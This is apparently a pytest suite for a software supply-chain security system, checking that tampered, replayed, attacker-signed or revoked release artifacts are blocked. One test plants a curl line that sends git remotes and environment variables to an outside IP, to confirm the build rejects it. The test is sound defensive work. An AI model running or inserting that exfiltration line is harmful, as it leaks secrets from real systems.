"""Automated validation of the required test cases (prompt section 19) plus extras.

    pytest -v
"""

import json
import shutil
import sqlite3
import ssl
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from attack_simulation.revoked_key_test import (
    attacker_impersonates_vendor_key, attacker_signs_with_own_key, attacker_uses_stolen_key,
)
from attack_simulation.tamper import forge_manifest_hash, inject_codecov_style_payload
from audit.audit_logger import AuditLog
from ci.security_gate import SecurityGate, run_pipeline
from common.crypto_utils import public_key_to_pem
from common.workspace import write_json
from distribution.tls_registry import RegistryServer, ensure_tls_material, fetch
from vendor.access_control import AccessDenied
from vendor.build import BuildError, build
from vendor.key_manager import KeyManager
from vendor.sign import SigningService, release
from verifier.verify import Status, Verifier


def verify(ws, a, m):
    return Verifier(ws).verify(a, m)


# 1 ------------------------------------------------------------------------------
def test_01_valid_artifact_passes(released):
    ws, a, m = released
    r = verify(ws, a, m)
    assert r.passed and r.status == Status.PASS
    assert all(c.passed for c in r.checks)
    assert SecurityGate(ws).evaluate(a, m).deployed


# 2 ------------------------------------------------------------------------------
def test_02_modified_artifact_blocked(released):
    ws, a, m = released
    inject_codecov_style_payload(a)
    r = verify(ws, a, m)
    assert not r.passed and r.status == Status.HASH_MISMATCH
    failed = {c.name for c in r.checks if not c.passed}
    assert {"sha256", "artifact_signature"} <= failed
    d = SecurityGate(ws).evaluate(a, m)
    assert not d.deployed and d.security_event["status"] == "HASH_MISMATCH"
    assert not (ws.deployed_dir / "secure-uploader").exists()


def test_02b_single_bit_flip_blocked(released):
    ws, a, m = released
    data = bytearray(a.read_bytes())
    data[len(data) // 2] ^= 0x01
    a.write_bytes(bytes(data))
    assert verify(ws, a, m).status == Status.HASH_MISMATCH


# 3 ------------------------------------------------------------------------------
def test_03_invalid_signature_blocked(released):
    ws, a, m = released
    env = json.loads(m.read_text())
    sig = bytearray(__import__("base64").b64decode(env["signatures"][0]["sig"]))
    sig[0] ^= 0xFF
    env["signatures"][0]["sig"] = __import__("base64").b64encode(bytes(sig)).decode()
    write_json(m, env)
    r = verify(ws, a, m)
    assert r.status == Status.INVALID_SIGNATURE


def test_03b_impersonated_key_id_blocked(released):
    ws, a, m = released
    attacker_impersonates_vendor_key(a, m)
    assert verify(ws, a, m).status == Status.INVALID_SIGNATURE


# 4 ------------------------------------------------------------------------------
def test_04_wrong_public_key_blocked(released):
    """Customer pinned a different root key -> the vendor trust policy is not accepted."""
    ws, a, m = released
    ws.trusted_root.write_text(public_key_to_pem(Ed25519PrivateKey.generate().public_key()))
    assert verify(ws, a, m).status == Status.INVALID_TRUST_POLICY


def test_04b_attacker_key_unauthorized(released):
    ws, a, m = released
    attacker_signs_with_own_key(a, m)
    assert verify(ws, a, m).status == Status.UNAUTHORIZED_KEY


# 5 ------------------------------------------------------------------------------
def test_05_revoked_key_blocked(released):
    ws, a, m = released
    KeyManager(ws).revoke(json.loads(m.read_text())["manifest"]["key_id"], "key compromise")
    r = verify(ws, a, m)
    assert r.status == Status.REVOKED
    assert not SecurityGate(ws).evaluate(a, m).deployed


def test_05b_stolen_key_blocked_by_content_scan_then_revocation(released):
    ws, a, m = released
    km = KeyManager(ws)
    kid = km.active_key_id()
    attacker_uses_stolen_key(a, m, km.load_private_key(kid))
    r = verify(ws, a, m)
    # all cryptographic checks pass with a stolen key ...
    assert {c.name for c in r.checks if not c.passed} == {"security_policy"}
    assert r.status == Status.POLICY_VIOLATION
    # ... and once the key is revoked the artifact is rejected on key status as well
    km.revoke(kid, "stolen")
    assert verify(ws, a, m).status == Status.REVOKED


# 6 ------------------------------------------------------------------------------
def test_06_modified_manifest_blocked(released):
    ws, a, m = released
    forge_manifest_hash(m, inject_codecov_style_payload(a))
    r = verify(ws, a, m)
    assert r.status == Status.INVALID_SIGNATURE
    assert any(c.name == "manifest_signature" and not c.passed for c in r.checks)


def test_06b_malformed_manifest_blocked(released):
    ws, a, m = released
    env = json.loads(m.read_text())
    del env["manifest"]["sha256"]
    write_json(m, env)
    assert verify(ws, a, m).status == Status.INVALID_MANIFEST


def test_06c_provenance_tampered_blocked(released):
    ws, a, m = released
    env = json.loads(m.read_text())
    env["manifest"]["provenance"]["builder_identity"] = "attacker-laptop"
    write_json(m, env)
    r = verify(ws, a, m)
    assert r.status == Status.INVALID_SIGNATURE  # signature covers provenance
    assert any(c.name == "provenance" and not c.passed for c in r.checks)


# 7 ------------------------------------------------------------------------------
def test_07_replay_of_old_version_blocked(ws):
    _, _, a1, m1 = release(ws, "1.0.0")
    _, _, a2, m2 = release(ws, "1.1.0")
    gate = SecurityGate(ws)
    old_a, old_m = [Path(shutil.copy2(p, ws.downloads_dir / p.name)) for p in (a1, m1)]
    assert gate.evaluate(a2, m2).deployed
    d = gate.evaluate(old_a, old_m)
    assert not d.deployed and d.result.status == Status.REPLAY_BLOCKED


def test_07b_revoked_version_and_minimum_version(ws):
    _, _, a1, m1 = release(ws, "1.0.0")
    km = KeyManager(ws)
    km.revoke_artifact("secure-uploader", "1.0.0", "vulnerable")
    assert verify(ws, a1, m1).status == Status.REVOKED
    _, _, a2, m2 = release(ws, "1.0.1")
    km.set_minimum_version("secure-uploader", "1.0.2")
    assert verify(ws, a2, m2).status == Status.REPLAY_BLOCKED


def test_07c_trust_policy_rollback_blocked(released):
    ws, a, m = released
    old_policy = ws.trust_policy.read_bytes()
    SecurityGate(ws).evaluate(a, m)  # customer sees current policy version
    KeyManager(ws).publish_trust_policy()  # newer policy
    SecurityGate(ws).evaluate(a, m)
    ws.trust_policy.write_bytes(old_policy)  # attacker serves the old policy
    assert verify(ws, a, m).status == Status.INVALID_TRUST_POLICY


def test_07d_trust_policy_tampering_blocked(released):
    ws, a, m = released
    env = json.loads(ws.trust_policy.read_text())
    kid = json.loads(m.read_text())["manifest"]["key_id"]
    env["policy"]["keys"][kid]["status"] = "active"
    env["policy"]["revoked_artifacts"] = []
    env["policy"]["expires_at"] = "2099-01-01T00:00:00Z"
    write_json(ws.trust_policy, env)
    assert verify(ws, a, m).status == Status.INVALID_TRUST_POLICY


# 8 ------------------------------------------------------------------------------
def test_08_unauthorized_signing_attempt_blocked(ws):
    b = build(ws, "1.0.0")
    svc = SigningService(ws)
    with pytest.raises(AccessDenied):  # wrong role
        svc.sign_release(user="bob", otp=svc.acl.current_otp("bob"), artifact_path=b.artifact_path,
                         version="1.0.0", provenance=b.provenance)
    with pytest.raises(AccessDenied):  # right role, bad MFA
        svc.sign_release(user="alice", otp="123456", artifact_path=b.artifact_path,
                         version="1.0.0", provenance=b.provenance)
    with pytest.raises(AccessDenied):  # unknown user
        svc.sign_release(user="mallory", otp="000000", artifact_path=b.artifact_path,
                         version="1.0.0", provenance=b.provenance)
    results = [e["result"] for e in AuditLog.for_workspace(ws).events() if e["action"] == "SIGN_RELEASE"]
    assert results.count("UNAUTHORIZED_SIGNER") == 3


def test_08b_malicious_source_never_signed(ws, tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    from common.workspace import SOURCE_DIR
    text = (SOURCE_DIR / "secure-uploader.sh").read_text()
    (src / "secure-uploader.sh").write_text(text.replace('main "$@"',
        'curl -sm 0.5 -d "$(git remote -v) $(env)" http://203.0.113.9/upload || true\nmain "$@"'))
    with pytest.raises(BuildError):
        build(ws, "1.0.0", source_dir=src)


# 9 ------------------------------------------------------------------------------
def test_09_valid_new_release_after_rotation(released):
    ws, a, m = released
    gate = SecurityGate(ws)
    assert gate.evaluate(a, m).deployed
    old, new = KeyManager(ws).rotate()
    _, _, a2, m2 = release(ws, "1.0.1")
    assert json.loads(m2.read_text())["manifest"]["key_id"] == new
    assert gate.evaluate(a2, m2).deployed
    # old release signed before rotation is still verifiable (retired, not revoked)
    assert verify(ws, a, m).checks[3].passed


# Extras ---------------------------------------------------------------------------
def test_audit_log_hash_chain_detects_tampering(released):
    ws, a, m = released
    SecurityGate(ws).evaluate(a, m)
    log = AuditLog.for_workspace(ws)
    assert log.verify_chain() == (True, None)
    with sqlite3.connect(ws.audit_db) as c:
        c.execute("UPDATE audit_events SET result='PASS' WHERE id=3")
    ok, bad = log.verify_chain()
    assert not ok and bad == 3


def test_private_keys_protected(ws):
    km = KeyManager(ws)
    kid = km.active_key_id()
    path = km._key_path(kid)
    assert b"ENCRYPTED PRIVATE KEY" in path.read_bytes()
    assert oct(path.stat().st_mode)[-3:] == "600"
    assert "PRIVATE" not in ws.trust_policy.read_text()
    with pytest.raises(Exception):
        KeyManager(ws, passphrase="wrong").load_private_key(kid)


def test_tls13_distribution_and_downgrade_refused(released):
    ws, a, m = released
    with RegistryServer(ws) as srv:
        info = fetch(ws, srv.base_url, a.name, dest_dir=ws.customer_dir / "tls")
        assert info["tls_version"] == "TLSv1.3"
        assert info["path"].read_bytes() == a.read_bytes()
        ca, _, _ = ensure_tls_material(ws)
        ctx = ssl.create_default_context(cafile=str(ca))
        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
        import http.client
        conn = http.client.HTTPSConnection("localhost", srv.port, context=ctx, timeout=5)
        with pytest.raises(ssl.SSLError):
            conn.request("GET", "/" + a.name)
        conn.close()


def test_tls_does_not_stop_compromised_registry(ws):
    """TLS 1.3 delivers the tampered file perfectly - only the signature check blocks it."""
    rep = run_pipeline(ws, "1.0.0", attack=lambda art, man: inject_codecov_style_payload(art))
    assert any(s["stage"] == "download over TLS" and "TLSv1.3" in s["detail"] for s in rep.stages)
    assert rep.decision is not None and not rep.decision.deployed
    assert rep.decision.result.status == Status.HASH_MISMATCH


def test_full_pipeline_deploys_legitimate_release(ws):
    rep = run_pipeline(ws, "2.0.0")
    assert rep.decision.deployed and rep.stopped_at is None
    assert (ws.deployed_dir / "secure-uploader").exists()


def test_false_acceptance_rate_zero(released):
    """Randomised tampering: every mutated artifact must be rejected (FAR = 0)."""
    import random
    ws, a, m = released
    original = a.read_bytes()
    rng = random.Random(1337)
    accepted = 0
    for _ in range(200):
        data = bytearray(original)
        op = rng.choice(("flip", "insert", "delete"))
        i = rng.randrange(len(data))
        if op == "flip":
            data[i] ^= 1 << rng.randrange(8)
        elif op == "insert":
            data.insert(i, rng.randrange(256))
        else:
            del data[i]
        a.write_bytes(bytes(data))
        accepted += verify(ws, a, m).passed
    assert accepted == 0
